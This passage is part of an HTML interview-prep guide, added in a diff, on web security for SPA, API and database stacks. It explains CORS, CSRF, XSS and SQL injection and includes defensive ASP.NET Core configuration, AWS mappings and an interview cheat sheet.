+    <div class="callout"><strong>XSS is not SQL injection.</strong> XSS is untrusted input becoming executable JavaScript in a browser. SQL injection is untrusted input becoming executable SQL in a database. Different injection sink, different defence. Both share one rule: <em>never mix data with code</em>.</div>
+
+    <!-- 22. Comparison table -->
+    <h3>22. CORS · CSRF · XSS · SQL injection — one table</h3>
+    <table>
+      <tr><th>Threat</th><th>Where it happens</th><th>Who enforces prevention</th><th>Primary risk</th><th>Primary controls</th></tr>
+      <tr><td>Same-Origin Policy violation</td><td>Browser</td><td>Browser</td><td>Cross-origin data leak</td><td>Built into every modern browser</td></tr>
+      <tr><td>CORS misconfiguration</td><td>Browser ⇄ API</td><td>Server (config) + browser (enforce)</td><td>Broken app or leaked responses</td><td>Explicit allow-list, no <code>*</code> with credentials, <code>Vary: Origin</code></td></tr>
+      <tr><td>CSRF</td><td>Browser (auth cookies attached)</td><td>Server (validate) + browser (SameSite)</td><td>Forged authenticated action</td><td>SameSite cookies, anti-CSRF token, origin check</td></tr>
+      <tr><td>XSS</td><td>UI rendering</td><td>Server &amp; UI framework (encode) + browser (CSP)</td><td>Attacker JS runs in trusted origin</td><td>Context-aware encoding, sanitizer, CSP</td></tr>
+      <tr><td>SQL Injection</td><td>API → DB</td><td>Server</td><td>DB compromise / data exfil</td><td>Parameterised queries, least-priv DB user</td></tr>
+      <tr><td>Clickjacking</td><td>Browser</td><td>Server (header) + browser</td><td>UI redress → tricked click</td><td><code>frame-ancestors 'none'</code></td></tr>
+    </table>
+
+    <!-- 23. Browser vs Server responsibility -->
+    <h3>23. Browser vs server responsibility — the durable mental model</h3>
+    <table>
+      <tr><th>Browser enforces</th><th>Server enforces</th><th>DB engine enforces</th></tr>
+      <tr><td>Same-Origin Policy</td><td>Authentication</td><td>Parameter binding</td></tr>
+      <tr><td>CORS (based on server headers)</td><td>Authorization (including object-level)</td><td>Row-level security</td></tr>
+      <tr><td>Cookie SameSite behaviour</td><td>CSRF token validation</td><td>Least-privilege user permissions</td></tr>
+      <tr><td>CSP enforcement</td><td>Input validation</td><td>Encryption at rest</td></tr>
+      <tr><td>HSTS enforcement</td><td>Output encoding / sanitization</td><td>Auditing / query logs</td></tr>
+      <tr><td>Mixed-content blocking</td><td>Business rules</td><td>Certificate-based mTLS</td></tr>
+      <tr><td>JS sandboxing</td><td>Rate limiting</td><td></td></tr>
+      <tr><td>Referrer-Policy</td><td>Security response headers</td><td></td></tr>
+    </table>
+
+    <!-- 24. Reverse proxy -->
+    <h3>24. CORS at the edge — API Gateway, reverse proxy, ingress</h3>
+    <p>CORS headers can be added by <em>any</em> layer on the response path: the app itself, an API Gateway, an Nginx reverse proxy, an ALB, a CloudFront distribution, a Kubernetes ingress. When two layers add CORS headers, the browser sees <em>both</em>, gets confused (duplicate <code>Access-Control-Allow-Origin</code> is treated as invalid), and blocks the response. This is the single most common "CORS works locally, breaks in staging" bug.</p>
+    <div class="callout warn"><strong>One owner rule.</strong> Pick one layer that owns CORS and turn it off everywhere else. Usually the API Gateway is the right owner because it also handles auth and rate-limiting; the app should trust upstream headers.</div>
+
+    <!-- 25. CDN + CORS -->
+    <h3>25. CDN caching + CORS</h3>
+    <p>If your API sits behind a CDN and CORS responses are cached, the cache key <em>must</em> include the <code>Origin</code> header — otherwise you serve the allowed-origin response for one caller to a different caller. Ensure <code>Vary: Origin</code> is in every CORS response, and configure the CDN to include <code>Origin</code> in its cache key. This is subtle enough that CloudFront, Fastly and Cloudflare each have named settings for it.</p>
+
+    <!-- 26. Credentialed cross-origin -->
+    <h3>26. Credentialed cross-origin request — the wiring</h3>
+    <pre><span class="cmt">// Frontend</span>
+<span class="kw">await</span> fetch(<span class="str">"https://api.example.com/orders"</span>, {
+    method: <span class="str">"POST"</span>,
+    credentials: <span class="str">"include"</span>,                <span class="cmt">// send cookies cross-origin</span>
+    headers: {
+        <span class="str">"Content-Type"</span>: <span class="str">"application/json"</span>,
+        <span class="str">"X-CSRF-Token"</span>: window.csrfToken
+    },
+    body: JSON.stringify({ productId: 42 })
+});</pre>
+    <pre><span class="cmt"># Server response headers (must all align)</span>
+Access-Control-Allow-Origin: https://portal.example.com   <span class="cmt"># exact, not *</span>
+Access-Control-Allow-Credentials: true
+Access-Control-Allow-Headers: Content-Type, X-CSRF-Token
+Access-Control-Allow-Methods: POST
+Vary: Origin
+
+<span class="cmt"># Session cookie set with:</span>
+Set-Cookie: sid=…; HttpOnly; Secure; SameSite=None; Path=/; Domain=example.com</pre>
+    <p>Every one of these has to line up. Common failure modes: <code>SameSite=Lax</code> on the cookie prevents cross-origin sending; <code>Access-Control-Allow-Origin: *</code> with credentials is silently ignored; missing <code>Vary: Origin</code> breaks under CDN caching.</p>
+
+    <!-- 27. Dev vs Prod CORS -->
+    <h3>27. Development vs. production CORS</h3>
+    <p>Local dev is inherently cross-origin: <code>http://localhost:4200</code> (Angular) or <code>:3000</code> (React) → <code>https://localhost:5001</code> (API). Do <em>not</em> paper over it with <code>Access-Control-Allow-Origin: *</code>; do it properly with an environment-scoped allow-list so dev matches prod behaviour.</p>
+    <pre><span class="cmt">// appsettings.Development.json</span>
+"Cors": { "AllowedOrigins": [ "http://localhost:4200", "http://localhost:3000" ] }
+
+<span class="cmt">// appsettings.Production.json</span>
+"Cors": { "AllowedOrigins": [ "https://portal.example.com", "https://admin.example.com" ] }</pre>
+
+    <!-- 28. Same-origin architecture -->
+    <h3>28. Alternative — put UI and API under the same origin</h3>
+    <p>If you serve the SPA and the API from the same origin via a reverse proxy — <code>app.example.com/</code> for the UI, <code>app.example.com/api/*</code> for the API — the browser sees them as one origin and CORS ceases to matter. Many teams do this precisely to remove a class of bugs.</p>
+    <div class="viz">Browser
+   │
+   ▼
+app.example.com                       (single origin)
+   │
+   ├─ /            → Frontend SPA
+   └─ /api/*       → Backend API (via reverse proxy)</div>
+    <div class="callout"><strong>Same-origin does not remove other security work.</strong> Auth, authorization, CSRF, XSS, input validation, and SQL injection are all still required. CORS was solving a specific browser problem — removing the boundary removes the problem, not the rest of the security model.</div>
+
+    <!-- 29. Threat model per boundary -->
+    <h3>29. Threats per trust boundary</h3>
+    <table>
+      <tr><th>Boundary</th><th>Threats</th><th>Controls</th></tr>
+      <tr><td>Browser / UI</td><td>XSS, CSRF, clickjacking, token theft, malicious extension</td><td>Framework auto-escape, sanitizer, CSP, SameSite, <code>frame-ancestors</code>, HttpOnly, HSTS</td></tr>
+      <tr><td>UI / API</td><td>CORS misconfig, auth bypass, IDOR/BOLA, API abuse, replay</td><td>Explicit CORS, authN, object-level authZ, CSRF token, rate limiting, request signing</td></tr>
+      <tr><td>API / DB</td><td>SQL injection, over-privileged DB creds, unencrypted traffic, credential leak</td><td>Parameterised queries, least-priv DB user, TLS in-flight, KMS-encrypted secrets, audit logs</td></tr>
+    </table>
+
+    <!-- 30. Misconceptions -->
+    <h3>30. Common misconceptions — get them out of your head</h3>
+    <div class="qa"><p class="q">"CORS protects my API from attackers."</p><p class="a">No. CORS controls whether browser JS can read a cross-origin response. curl/Postman/mobile apps don't enforce CORS. Every endpoint must authN/authZ independently.</p></div>
+    <div class="qa"><p class="q">"If Postman works, the browser should also work."</p><p class="a">Not necessarily. Postman ignores SOP/CORS. The browser will block a valid response if CORS headers are missing.</p></div>
+    <div class="qa"><p class="q">"A CORS error means the API was not called."</p><p class="a">For preflighted requests, sometimes true. For simple requests, the request usually reached the server and returned successfully — the browser just refused to expose it to JS.</p></div>
+    <div class="qa"><p class="q">"Different subdomains are same origin."</p><p class="a">Different origin, same site. CORS treats them as cross-origin; SameSite cookies do not.</p></div>
+    <div class="qa"><p class="q">"SameSite and Same-Origin mean the same thing."</p><p class="a">No. Origin = scheme+host+port. Site = scheme+registrable domain.</p></div>
+    <div class="qa"><p class="q">"Client-side validation is enough."</p><p class="a">No. Any attacker can bypass the client. Server-side validation is mandatory.</p></div>
+    <div class="qa"><p class="q">"HttpOnly prevents CSRF."</p><p class="a">No. HttpOnly prevents JS from reading the cookie. CSRF exploits the browser auto-attaching it. Use SameSite + anti-CSRF token.</p></div>
+    <div class="qa"><p class="q">"CSP prevents XSS."</p><p class="a">It mitigates the damage. Encode your output; use CSP as defence-in-depth.</p></div>
+    <div class="qa"><p class="q">"If the frontend hides a button, the user can't call that API."</p><p class="a">They can with Postman. Authorization must live on the server.</p></div>
+
+    <!-- 31. Debugging CORS -->
+    <h3>31. Debugging a "CORS error but backend logs show 200"</h3>
+    <ol>
+      <li>Open DevTools → Network tab. Filter by the failing URL.</li>
+      <li>Was there an <code>OPTIONS</code> request? If yes and it 4xx'd, the preflight failed — check <code>Access-Control-Request-*</code> vs the server's <code>Access-Control-Allow-*</code>.</li>
+      <li>If no OPTIONS, the request is "simple" — the response reached the browser. Check the response headers: is <code>Access-Control-Allow-Origin</code> present, does it exactly match the page's origin, is <code>Allow-Credentials</code> present if credentials were sent?</li>
+      <li>Check for duplicate CORS headers (API Gateway + app both adding them).</li>
+      <li>Check the <code>Origin</code> header the browser sent — does the allow-list contain it exactly (including scheme)?</li>
+      <li>Check <code>Vary: Origin</code> if there is a CDN in the path.</li>
+      <li>Check the browser's console for the exact CORS error string — it names the missing header.</li>
+    </ol>
+  </section>
+
+  <!-- ============================ CONCEPTS / DSA-STYLE ============================ -->
+  <section id="dsa" class="card dsa">
+    <span class="badge">🧮 The concepts behind it</span>
+    <h2>Underlying algorithms &amp; data structures</h2>
+    <p>Web security looks operational, but each control is grounded in a small algorithmic idea. Being able to name them shows architectural depth in an interview.</p>
+
+    <h3>Cryptographic signature verification (JWT, cookies, CSRF tokens)</h3>
+    <p>All three carry a secret-keyed signature (HMAC or RSA/ECDSA) so the server can verify a token was issued by itself. HMAC-SHA-256 is the workhorse: <code>tag = HMAC(secret, header + "." + payload)</code>; verify by recomputing the tag and constant-time comparing.</p>
+
+    <h3>Constant-time string comparison</h3>
+    <p>Signature and CSRF-token comparison must use a constant-time equality (<code>CryptographicOperations.FixedTimeEquals</code> in .NET) to prevent timing side-channels. Even one microsecond of variance leaks information about the correct byte prefix — a classical attack.</p>
+
+    <h3>Cryptographically-random tokens</h3>
+    <p>CSRF tokens, session IDs, nonces, refresh tokens are drawn from a CSPRNG (<code>RandomNumberGenerator</code>, <code>/dev/urandom</code>), never from <code>Math.random</code> or <code>Guid.NewGuid</code>. 128 bits of entropy is the interview-safe answer.</p>
+
+    <h3>Parser-based encoding (not regex)</h3>
+    <p>Output encoding is <em>context-aware</em>: HTML, HTML-attribute, JS, CSS, URL contexts all have different escape rules. Frameworks parse the template context and choose the right encoder; regex-based sanitisers are famously bypassable (Samy worm et al.).</p>
+
+    <h3>Bloom-filter / count-min for rate limiting</h3>
+    <p>Not strictly a "browser" control but sits at the API edge; approximate data structures let a WAF or gateway shed traffic at high QPS without a hot DB.</p>
+
+    <h3>Content-security nonces = short-lived allow-list</h3>
+    <p>Per-response random nonce is emitted in the CSP header and stamped into each legitimate inline <code>&lt;script nonce="…"&gt;</code>. Browser executes only script tags whose nonce matches. Injected script (without the nonce) is refused.</p>
+
+    <table>
+      <tr><th>Operation</th><th>Complexity</th><th>Where</th></tr>
+      <tr><td>HMAC verify</td><td>O(n) over token length</td><td>API middleware</td></tr>
+      <tr><td>CSRF token compare</td><td>O(n), constant-time</td><td>API middleware</td></tr>
+      <tr><td>CORS allow-list check</td><td>O(1) hashset</td><td>API / gateway</td></tr>
+      <tr><td>SQL parameter bind</td><td>O(1) per param</td><td>DB driver</td></tr>
+      <tr><td>CSP nonce enforcement</td><td>O(1) per script tag</td><td>Browser</td></tr>
+    </table>
+  </section>
+
+  <!-- ============================ AWS ============================ -->
+  <section id="aws" class="card aws">
+    <span class="badge">☁️ AWS implementation</span>
+    <h2>Mapping the design to AWS</h2>
+    <table>
+      <tr><th>Layer</th><th>AWS service</th><th>Role</th></tr>
+      <tr><td>UI hosting</td><td><strong>CloudFront + S3</strong> (or Amplify Hosting)</td><td>Static SPA, HTTPS/HSTS, security headers via CloudFront Functions or response-headers policy</td></tr>
+      <tr><td>Edge / WAF</td><td><strong>AWS WAF</strong> (attached to CloudFront or ALB)</td><td>Managed rulesets for XSS/SQLi/bot signatures; rate-based rules; log to Firehose</td></tr>
+      <tr><td>API</td><td><strong>API Gateway (HTTP/REST)</strong> or <strong>ALB → ECS/EKS/Lambda</strong></td><td>TLS termination, CORS configuration, authorization via Cognito/JWT authorizer</td></tr>
+      <tr><td>Identity</td><td><strong>Amazon Cognito</strong> (or Okta/Auth0 via OIDC)</td><td>Issues JWTs / manages sessions; MFA; refresh tokens</td></tr>
+      <tr><td>Secrets</td><td><strong>Secrets Manager / Parameter Store</strong> + <strong>KMS</strong></td><td>JWT signing keys, DB creds, CSRF secret; automatic rotation</td></tr>
+      <tr><td>App runtime</td><td><strong>ECS Fargate / EKS / Lambda</strong></td><td>Runs the .NET/Node API with per-service IAM role</td></tr>
+      <tr><td>Database</td><td><strong>Aurora Postgres / RDS SQL Server / DynamoDB</strong></td><td>Private subnet, encrypted at rest via KMS, IAM auth / Secrets Manager creds, pgaudit / SQL audit</td></tr>
+      <tr><td>Observability</td><td><strong>CloudWatch Logs</strong>, <strong>X-Ray</strong>, <strong>GuardDuty</strong>, <strong>Security Hub</strong></td><td>Trace and correlate auth failures, CSP reports, WAF blocks</td></tr>
+      <tr><td>Network</td><td><strong>VPC</strong>, <strong>PrivateLink</strong>, Security Groups</td><td>API talks to DB over private VPC; DB has no public route</td></tr>
+    </table>
+    <p>Deployment shape for a mid-size app: CloudFront in front of an S3 bucket for the SPA (with a response-headers policy adding CSP/HSTS/X-Content-Type-Options), CloudFront also fronts <code>api.example.com</code> which hits API Gateway (CORS configured there, one owner), a Lambda-authorizer or Cognito authorizer validates JWTs on every request, the compute is ECS Fargate in a private subnet, and Aurora Postgres in another private subnet listens only inside the VPC. Every service-to-service call uses IAM auth or mTLS.</p>
+    <div class="callout"><strong>Where does CORS live in AWS?</strong> Prefer API Gateway's built-in CORS config (single owner, one YAML block) and turn off any app-level CORS to avoid duplicate headers. For CloudFront in front, use a <code>Response Headers Policy</code> for CSP/HSTS/security headers — do <em>not</em> also add them at the app tier.</div>
+  </section>
+
+  <!-- ============================ C# ============================ -->
+  <section id="code" class="card">
+    <h2>💻 C# / .NET reference — every layer wired correctly</h2>
+    <p>ASP.NET Core makes each control a one-liner in <code>Program.cs</code>. The point of this snippet is to show them all in one place — you cannot forget one because they are literally next to each other.</p>
+
+    <pre><span class="cmt">// Program.cs — production-safe defaults for a 3-tier SPA + API</span>
+
+<span class="kw">var</span> builder = WebApplication.CreateBuilder(args);
+
+<span class="cmt">// -------- 1. CORS: explicit allow-list, credentials on -----------------</span>
+builder.Services.AddCors(o =&gt; o.AddPolicy(<span class="str">"spa"</span>, p =&gt; p
+    .WithOrigins(builder.Configuration.GetSection(<span class="str">"Cors:AllowedOrigins"</span>).Get&lt;<span class="kw">string</span>[]&gt;()!)
+    .AllowCredentials()
+    .WithMethods(<span class="str">"GET"</span>, <span class="str">"POST"</span>, <span class="str">"PUT"</span>, <span class="str">"PATCH"</span>, <span class="str">"DELETE"</span>)
+    .WithHeaders(<span class="str">"Content-Type"</span>, <span class="str">"Authorization"</span>, <span class="str">"X-CSRF-Token"</span>)
+    .WithExposedHeaders(<span class="str">"X-Request-Id"</span>)
+    .SetPreflightMaxAge(<span class="typ">TimeSpan</span>.FromMinutes(10))));
+
+<span class="cmt">// -------- 2. AuthN — cookie for the SPA, JWT for third-party clients ---</span>
+builder.Services.AddAuthentication(<span class="str">"Cookies"</span>)
+    .AddCookie(<span class="str">"Cookies"</span>, opt =&gt; {
+        opt.Cookie.HttpOnly     = <span class="kw">true</span>;              <span class="cmt">// no JS access</span>
+        opt.Cookie.SecurePolicy = <span class="typ">CookieSecurePolicy</span>.Always;
+        opt.Cookie.SameSite     = <span class="typ">SameSiteMode</span>.Lax;   <span class="cmt">// tight; None only if cross-site</span>
+    })
+    .AddJwtBearer(<span class="str">"Bearer"</span>, opt =&gt; {
+        opt.Authority = <span class="str">"https://cognito-idp.us-east-1.amazonaws.com/us-east-1_XXX"</span>;
+        opt.TokenValidationParameters.ValidateAudience = <span class="kw">true</span>;
+        opt.TokenValidationParameters.ValidateIssuer   = <span class="kw">true</span>;
+    });
+
+<span class="cmt">// -------- 3. Anti-forgery (CSRF) token for cookie-authenticated calls --</span>
+builder.Services.AddAntiforgery(o =&gt; {
+    o.HeaderName            = <span class="str">"X-CSRF-Token"</span>;
+    o.Cookie.Name           = <span class="str">"XSRF-TOKEN"</span>;
+    o.Cookie.HttpOnly       = <span class="kw">false</span>;                <span class="cmt">// readable by SPA — that's fine</span>
+    o.Cookie.SameSite       = <span class="typ">SameSiteMode</span>.Strict;
+    o.Cookie.SecurePolicy   = <span class="typ">CookieSecurePolicy</span>.Always;
+});
+
+builder.Services.AddAuthorization();
+builder.Services.AddControllers()
+    .AddJsonOptions(o =&gt; o.JsonSerializerOptions.PropertyNamingPolicy = <span class="typ">JsonNamingPolicy</span>.CamelCase);
+<span class="kw">var</span> app = builder.Build();
+
+<span class="cmt">// -------- 4. Security response headers (CSP + friends) ----------------</span>
+app.Use(<span class="kw">async</span> (ctx, next) =&gt; {
+    <span class="kw">var</span> nonce = <span class="typ">Convert</span>.ToBase64String(<span class="typ">RandomNumberGenerator</span>.GetBytes(16));
+    ctx.Items[<span class="str">"csp-nonce"</span>] = nonce;
+
+    <span class="kw">var</span> h = ctx.Response.Headers;
+    h[<span class="str">"Content-Security-Policy"</span>] =
+        $<span class="str">"default-src 'self'; script-src 'self' 'nonce-{nonce}'; " </span>+
+        <span class="str">"style-src 'self' 'unsafe-inline'; img-src 'self' data:; " </span>+
+        <span class="str">"connect-src 'self' https://api.example.com; " </span>+
+        <span class="str">"frame-ancestors 'none'; object-src 'none'; base-uri 'self'"</span>;
+    h[<span class="str">"Strict-Transport-Security"</span>] = <span class="str">"max-age=63072000; includeSubDomains; preload"</span>;
+    h[<span class="str">"X-Content-Type-Options"</span>]   = <span class="str">"nosniff"</span>;
+    h[<span class="str">"Referrer-Policy"</span>]          = <span class="str">"strict-origin-when-cross-origin"</span>;
+    h[<span class="str">"Permissions-Policy"</span>]       = <span class="str">"geolocation=(), microphone=(), camera=()"</span>;
+
+    <span class="kw">await</span> next();
+});
+
+app.UseHttpsRedirection();
+app.UseCors(<span class="str">"spa"</span>);           <span class="cmt">// must run before auth</span>
+app.UseAuthentication();
+app.UseAuthorization();
+
+<span class="cmt">// Short-circuit OPTIONS preflight before auth middleware asks for creds</span>
+app.MapMethods(<span class="str">"/{**path}"</span>, <span class="kw">new</span>[] { <span class="str">"OPTIONS"</span> }, () =&gt; <span class="typ">Results</span>.NoContent())
+    .AllowAnonymous();
+
+app.MapControllers();
+app.Run();
+
+<span class="cmt">// -------- 5. A controller — every server-side gate in one method -----</span>
+[<span class="typ">ApiController</span>, <span class="typ">Route</span>(<span class="str">"orders"</span>), <span class="typ">Authorize</span>]
+<span class="kw">public class</span> <span class="typ">OrdersController</span>(<span class="typ">IOrderRepository</span> repo, <span class="typ">IAntiforgery</span> af) : <span class="typ">ControllerBase</span>
+{
+    [<span class="typ">HttpPost</span>, <span class="typ">ValidateAntiForgeryToken</span>]
+    <span class="kw">public async</span> <span class="typ">Task</span>&lt;<span class="typ">IActionResult</span>&gt; <span class="fn">Create</span>([<span class="typ">FromBody</span>] <span class="typ">CreateOrderRequest</span> body)
+    {
+        <span class="cmt">// Input validation via DataAnnotations + FluentValidation runs here.</span>
+        <span class="kw">if</span> (!ModelState.IsValid) <span class="kw">return</span> ValidationProblem(ModelState);
+
+        <span class="kw">var</span> userId = <span class="typ">Guid</span>.Parse(User.FindFirstValue(<span class="str">"sub"</span>)!);
+
+        <span class="cmt">// Object-level authorization: enforce ownership in the WHERE clause.</span>
+        <span class="kw">var</span> account = <span class="kw">await</span> repo.GetAccountForUserAsync(userId, body.AccountId);
+        <span class="kw">if</span> (account <span class="kw">is null</span>) <span class="kw">return</span> Forbid();
+
+        <span class="cmt">// Parameterised query — DB never sees a concatenated string.</span>
+        <span class="kw">var</span> orderId = <span class="kw">await</span> repo.InsertOrderAsync(<span class="kw">new</span> {
+            userId, account.Id, body.ProductId, body.Quantity
+        });
+
+        <span class="kw">return</span> CreatedAtAction(<span class="kw">nameof</span>(Get), <span class="kw">new</span> { id = orderId }, <span class="kw">null</span>);
+    }
+}
+
+<span class="kw">public class</span> <span class="typ">CreateOrderRequest</span>
+{
+    [<span class="typ">Required</span>] <span class="kw">public</span> <span class="typ">Guid</span> AccountId { <span class="kw">get</span>; <span class="kw">set</span>; }
+    [<span class="typ">Required</span>, <span class="typ">Range</span>(1, 10_000)] <span class="kw">public int</span> ProductId { <span class="kw">get</span>; <span class="kw">set</span>; }
+    [<span class="typ">Range</span>(1, 100)]              <span class="kw">public int</span> Quantity  { <span class="kw">get</span>; <span class="kw">set</span>; }
+}
+
+<span class="cmt">// -------- 6. Repository — Dapper parameterises everything ------------</span>
+<span class="kw">public class</span> <span class="typ">OrderRepository</span>(<span class="typ">IDbConnection</span> db) : <span class="typ">IOrderRepository</span>
+{
+    <span class="kw">public</span> <span class="typ">Task</span>&lt;<span class="kw">int</span>&gt; <span class="fn">InsertOrderAsync</span>(<span class="kw">object</span> p) =&gt;
+        db.ExecuteScalarAsync&lt;<span class="kw">int</span>&gt;(<span class="str">@"
+            INSERT INTO orders (user_id, account_id, product_id, qty)
+            VALUES (@userId, @Id, @ProductId, @Quantity)
+            RETURNING id"</span>, p);
+}</pre>
+
+    <p>Every non-trivial security control lives in that single snippet: CORS allow-list, cookie flags, JWT validation, anti-forgery, CSP with nonce, HSTS, HTTPS redirect, OPTIONS short-circuit, <code>[Authorize]</code>, model validation, object-level authorization, parameterised query.</p>
+  </section>
+
+  <!-- ============================ TRADE-OFFS ============================ -->
+  <section id="tradeoffs" class="card">
+    <h2>⚖️ Trade-offs, bottlenecks &amp; likely follow-ups</h2>
+
+    <h3>Trade-offs</h3>
+    <p><strong>Cookies vs bearer tokens.</strong> Cookies give you XSS-resistant transport (HttpOnly) but require CSRF work; bearer tokens sidestep CSRF but expose the token to XSS. Choose per-audience: cookies for first-party SPAs, bearers for third-party APIs / mobile.</p>
+    <p><strong>CSP strictness.</strong> A strict nonce-based CSP genuinely kills most XSS categories, but breaks inline analytics snippets and third-party widgets. Start with a report-only CSP for two weeks, tune, then enforce.</p>
+    <p><strong>SameSite: Lax vs Strict.</strong> Strict is safer but breaks the "click a link in an email → arrive already logged in" experience. Lax is the pragmatic default.</p>
+    <p><strong>Same-origin architecture.</strong> Removes CORS complexity but couples the SPA and API deployments (usually via reverse proxy). Fine for one-team products; awkward if the API needs to be reached from many independent UIs.</p>
+
+    <h3>Bottlenecks in practice</h3>
+    <ul>
+      <li><strong>CORS at multiple layers.</strong> The most common production bug — one owner or you'll fight duplicated headers forever.</li>
+      <li><strong>Long-lived JWTs in localStorage.</strong> One XSS bug, game over. Prefer short JWTs held in memory + HttpOnly refresh cookie.</li>
+      <li><strong>Client-side-only validation.</strong> Every internal admin tool has a forgotten server-side check.</li>
+      <li><strong>Missing object-level authZ.</strong> Enable the OWASP API Security Top 10 checks in your SAST/DAST.</li>
+      <li><strong>Wildcards in production.</strong> <code>Access-Control-Allow-Origin: *</code> or a permissive CSP defeats the whole point.</li>
+    </ul>
+
+    <h3>Likely interview follow-ups</h3>
+    <div class="qa"><p class="q">What is an origin, precisely?</p><p class="a">Scheme + host + port. All three must match.</p></div>
+    <div class="qa"><p class="q">Who enforces CORS?</p><p class="a">The browser. The server just declares which origins are allowed via headers.</p></div>
+    <div class="qa"><p class="q">Why does Postman not show CORS errors?</p><p class="a">CORS/SOP are browser features. Postman is a raw HTTP client and does not sandbox untrusted script from multiple origins.</p></div>
+    <div class="qa"><p class="q">Can an API return 200 and the browser still show a CORS error?</p><p class="a">Yes — for simple requests. The request lands on the server, the response comes back, and the browser refuses to let JS read it. The server logs a 200.</p></div>
+    <div class="qa"><p class="q">Why can't I use <code>Access-Control-Allow-Origin: *</code> with credentials?</p><p class="a">Because that would let any origin read authenticated responses on the user's behalf. The spec requires an explicit origin when credentials are in play.</p></div>
+    <div class="qa"><p class="q">Does CORS secure my API?</p><p class="a">No. Any non-browser client ignores it. Every endpoint must authenticate and authorise independently.</p></div>
+    <div class="qa"><p class="q">CORS vs CSRF?</p><p class="a">CORS controls cross-origin JS reading responses. CSRF is about forged authenticated writes. Correct CORS does not solve CSRF; correct CSRF defenses do not require CORS.</p></div>
+    <div class="qa"><p class="q">CSRF vs XSS?</p><p class="a">CSRF makes the user's browser do something without their intent, using their own cookies. XSS runs the attacker's code inside your origin — much worse because SOP now trusts it.</p></div>
+    <div class="qa"><p class="q">Same-Origin vs SameSite?</p><p class="a">Origin = scheme+host+port. Site = scheme+registrable-domain. CORS is origin; cookie SameSite is site.</p></div>
+    <div class="qa"><p class="q">What does HttpOnly protect against?</p><p class="a">Cookie theft via JavaScript (XSS reading <code>document.cookie</code>). It does <em>not</em> stop CSRF.</p></div>
+    <div class="qa"><p class="q">What is CSP and how does it help against XSS?</p><p class="a">A response header telling the browser which sources of script/style/etc are allowed. Even if an attacker injects a script tag, the browser refuses to execute it if CSP doesn't allow that source or nonce.</p></div>
+    <div class="qa"><p class="q">Stored vs reflected vs DOM XSS?</p><p class="a">Stored — payload persisted in DB, delivered on every render. Reflected — payload in URL, echoed back by the server. DOM — payload consumed by client-side JS that writes it into the DOM unsafely.</p></div>
+    <div class="qa"><p class="q">Why is server-side validation required if the frontend already validates?</p><p class="a">Because the frontend can be bypassed by any HTTP client. Client validation is UX; server validation is the security boundary.</p></div>
+    <div class="qa"><p class="q">How do parameterised queries prevent SQL injection?</p><p class="a">The SQL text is sent to the DB with placeholders; the parameter values are bound separately. The DB parses SQL first and never treats the values as code — quoting/escaping bugs become impossible.</p></div>
+    <div class="qa"><p class="q">Where should CORS be configured?</p><p class="a">In exactly one layer — usually the API Gateway. Duplicate headers from multiple layers are the #1 debugging pain.</p></div>
+    <div class="qa"><p class="q">Can I avoid CORS completely?</p><p class="a">Yes — serve UI and API from the same origin via a reverse proxy. But you still need auth, authZ, CSRF, XSS, and input-validation controls.</p></div>
+    <div class="qa"><p class="q">How do you secure UI → API → DB end-to-end?</p><p class="a">Browser: HTTPS + HSTS + CSP + SameSite cookies. UI: framework auto-escape, no unsafe HTML rendering. UI↔API: explicit CORS allow-list, authN, object-level authZ, CSRF token, server-side validation. API↔DB: private network, TLS, least-priv DB user, parameterised queries. Plus WAF, rate limiting, and audit logs on top.</p></div>
+
+    <h3>Observability — what to alert on</h3>
+    <div class="viz">auth_failure_rate            counter/rate   <span style="color:#f7567c">alert on spike</span>
+authz_denied                 counter        <span style="color:#f7567c">alert on non-zero per user</span>
+csrf_token_rejected          counter        <span style="color:#f7567c">alert on non-zero</span>
+cors_preflight_rejected      counter        <span style="color:#a3b1c8">investigate — usually a config bug</span>
+csp_violation_reports        counter        <span style="color:#a3b1c8">tune before enforce; alert after</span>
+sql_error_rate               counter        <span style="color:#f7567c">SQLi attempts show up here</span>
+waf_blocked_requests         counter/rate   <span style="color:#a3b1c8">bot &amp; injection signatures</span>
+login_failure_by_source_ip   counter        <span style="color:#f7567c">credential-stuffing detector</span></div>
+  </section>
+
+  <!-- ============================ CHEAT SHEET ============================ -->
+  <section id="cheat" class="cheat">
+    <h2>🗣️ Interview cheat sheet — the 3–5 minute answer</h2>
+    <p class="pitch"><strong>Open with the picture.</strong> "Every three-tier app has three trust boundaries: browser → UI, UI → API, API → DB. Different security concepts live at different boundaries — one of the biggest mistakes I see is treating them as one bucket. Let me walk through them in the order a request travels."</p>
+    <p class="pitch"><strong>Origin, SOP, CORS.</strong> "An origin is scheme + host + port. Same-Origin Policy is a browser rule that stops JavaScript on one origin from reading responses from another. CORS is the server's opt-in relaxation — <code style="color:#fff;background:rgba(255,255,255,.2)">Access-Control-Allow-Origin</code> plus friends. Enforced by the browser, not the server, which is exactly why Postman doesn't show CORS errors. For any non-simple request the browser sends an <code style="color:#fff;background:rgba(255,255,255,.2)">OPTIONS</code> preflight first."</p>
+    <p class="pitch"><strong>Cookies, SameSite, CSRF.</strong> "Cookies auto-attach on same-site requests. That auto-attach is what CSRF abuses — evil.com posts a form to bank.com and the cookie tags along. Defences: SameSite=Lax kills most of it automatically, a per-session anti-CSRF token defeats the rest, and origin validation is the belt. Note SameSite is scheme + registrable-domain, so portal.example.com and api.example.com are different <em>origin</em> but same <em>site</em>."</p>
+    <p class="pitch"><strong>XSS and CSP.</strong> "XSS is worse than CORS violations because the attacker's script runs <em>as your origin</em> — SOP now trusts it. Prevention is context-aware output encoding, framework auto-escape you don't bypass, and HTML sanitizer for rich-text. CSP is defense in depth: a header telling the browser only these script sources or this nonce may execute. It doesn't replace encoding, it shrinks the damage."</p>
+    <p class="pitch"><strong>Server-side controls.</strong> "CORS is not authentication. Every endpoint must authN (session cookie or JWT), authZ including object-level checks so you don't get IDOR, validate input server-side even if the client did, and reach the DB with parameterised queries under a least-privilege DB user. Bonus: security headers — HSTS, X-Content-Type-Options, Referrer-Policy — set once at the edge."</p>
+    <p class="pitch"><strong>Close with the mental model.</strong> "CORS controls cross-origin <em>reads</em>. CSRF prevents forged <em>writes</em>. XSS is attacker script <em>inside</em> a trusted origin. CSP is a browser-side safety net. AuthN is who, AuthZ is what. Input validation is shape. Parameterised queries are the DB boundary. Different boundaries, different controls — that's the whole picture."</p>
+
+    <h3>5 talking points that win the round</h3>
+    <ul>
+      <li><strong>Concept-to-boundary map.</strong> Say the trust boundaries out loud and place each control on one. Instant credibility.</li>
+      <li><strong>"CORS is not authentication."</strong> Say it before the interviewer has to.</li>
